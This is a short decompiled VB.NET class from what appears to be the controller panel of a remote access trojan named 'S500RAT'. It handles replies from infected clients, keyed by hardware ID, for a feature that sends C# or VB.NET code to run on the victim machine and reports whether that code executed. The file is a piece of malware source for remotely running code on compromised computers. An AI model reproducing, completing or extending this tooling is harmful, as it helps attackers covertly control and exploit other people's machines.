Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000048 RID: 72
	Public Class FrmDotNET
		' Token: 0x06001185 RID: 4485 RVA: 0x00097DD8 File Offset: 0x00095FD8
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formDotNetEditor As FormDotNetEditor = CType(Application.OpenForms("FormDotNetEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormDotNetEditor)
				Dim flag As Boolean = formDotNetEditor IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formDotNetEditor.Client Is Nothing
					If flag2 Then
						formDotNetEditor.Client = client
						formDotNetEditor.Timer1.Enabled = True
					End If
					formDotNetEditor.Execute.Enabled = True
					formDotNetEditor.Scharp.Enabled = True
					formDotNetEditor.VbNet.Enabled = True
					formDotNetEditor.TextBox1.Enabled = True
					formDotNetEditor.T1.Enabled = True
					Dim flag3 As Boolean = Operators.CompareString(unpack_msgpack.ForcePathObject("State").AsString, "Yes", False) = 0
					If flag3 Then
						formDotNetEditor.StateDotNET.LinkColor = Color.Green
						formDotNetEditor.StateDotNET.Text = "Code executed successfully"
					Else
						Dim flag4 As Boolean = Operators.CompareString(unpack_msgpack.ForcePathObject("State").AsString, "No", False) = 0
						If flag4 Then
							formDotNetEditor.StateDotNET.LinkColor = Color.Red
							formDotNetEditor.StateDotNET.Text = "An unexpected error occurred while executing the code"
						Else
							Debug.WriteLine(unpack_msgpack.ForcePathObject("State").AsString)
						End If
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
